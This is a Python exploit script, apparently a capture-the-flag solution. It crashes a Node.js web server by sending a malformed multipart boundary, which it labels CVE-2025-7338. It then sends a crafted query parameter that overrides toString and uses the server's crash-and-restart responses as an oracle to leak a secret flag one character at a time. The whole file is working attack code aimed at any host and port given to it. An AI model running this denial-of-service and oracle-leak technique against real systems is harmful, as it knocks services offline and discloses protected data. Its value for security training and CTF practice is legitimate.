import requests
import time
import string
import sys
import socket
if len(sys.argv) != 3:
    print(f"Usage: python {sys.argv[0]} <host> <port>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = int(sys.argv[2])
TARGET = f"http://{HOST}:{PORT}"
KNOWN_FLAG = "EOF{" 
START_INDEX = 4 # Start checking at index 4 (should be '{')

CHARSET = string.digits 

def force_crash():
    """
    CVE-2025-7338: Send malformed multipart boundary to crash Node.js process
    """
    boundary = "----FormBoundary"
    
    body = "\r\n".join([
        "------FormBoundary",
        'Content-Disposition: form-data; name="image"; filename=""',
        "Content-Type: application/octet-stream",
        "",
        "",
        "------FormBoundar"  # intentionally malformed (missing 'y')
    ])
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((HOST, PORT))
        
        request = (
            f"POST /setup HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
        )
        
        s.sendall(request.encode() + body.encode())
        s.close()
    except:
        pass
    
    # Wait for respawn
    time.sleep(1.5)


def wait_for_up():
    for _ in range(20):
        try:
            requests.get(TARGET, timeout=1)
            return True
        except:
            time.sleep(0.5)
    return False

def try_char(index, char):
    # 1. Ensure UP and CLEAN (or try to setup)
    # If we are dirty from previous loop, force_crash was called.
    # So we should be clean.
    
    # 2. Setup Profile
    name = "a" * index
    bio = "a" * index + char
    files = {'profile_photo': ('t.png', 'fake', 'image/png')}
    
    try:
        r = requests.post(TARGET + "/setup", data={"name": name, "bio": bio}, files=files, timeout=2)
        if r.status_code == 409:
            # Dirty. Force crash and retry this char.
            return "DIRTY"
        if r.status_code != 200 and r.status_code != 302:
            return "SETUP_ERROR"
    except:
        # If setup request failed (conn error), maybe it was down?
        return "SETUP_ERROR"

    # 3. Trigger Oracle
    # ?setdown=1&setdomn[toString]=crash
    url = f"{TARGET}/?setdown=1&setdomn%5BtoString%5D=crash"
    
    try:
        r = requests.get(url, timeout=2)
        if r.status_code == 500:
            # MATCH! Server crash logic triggered.
            # Server will restart automatically.
            return "MATCH"
        elif r.status_code == 200:
            # MISMATCH. Logic skipped.
            # Server is now DIRTY.
            return "MISMATCH"
    except:
        # Timeout/Connection Error usually means stuck or crashed.
        # Check if down.
        if not wait_for_up():
             # If it went down, it likely crashed -> MATCH.
             return "MATCH"
        # If it came back up? Ambiguous. Assume match or retry?
        # A true 500 usually returns fast.
        return "ERROR"
        
    return "UNKNOWN"

def leak():
    current_flag = KNOWN_FLAG
    index = START_INDEX
    
    print(f"Starting leak from index {index}...")
    
    # Ensure fresh start
    force_crash()
    wait_for_up()
    
    while True:
        found = False
        for c in CHARSET:
            sys.stdout.write(f"\rFlag: {current_flag} | Trying: {c} ")
            sys.stdout.flush()
            
            while True:
                res = try_char(index, c)
                
                if res == "MATCH":
                    current_flag += c
                    found = True
                    print(f"\nFOUND: {c} -> {current_flag}")
                    # Don't need to force crash, it crashed itself (500).
                    # Just wait for it to be up.
                    wait_for_up()
                    break
                
                elif res == "MISMATCH":
                    # Wrong char. Server is dirty. Force crash.
                    force_crash()
                    wait_for_up()
                    break # Go to next char
                    
                elif res == "DIRTY":
                    # Was dirty before setup? Force crash and Retry SAME char
                    force_crash()
                    wait_for_up()
                    continue
                    
                else:
                    # Error? Retry same char
                    force_crash()
                    wait_for_up()
                    continue
            
            if found:
                break
        
        if not found:
            print("\nCould not find char! End of flag or missing char in set.")
            break
            
        index += 1
        if current_flag.endswith("}"):
            break

    print(f"\nFULL FLAG: {current_flag}")

if __name__ == "__main__":
    leak()
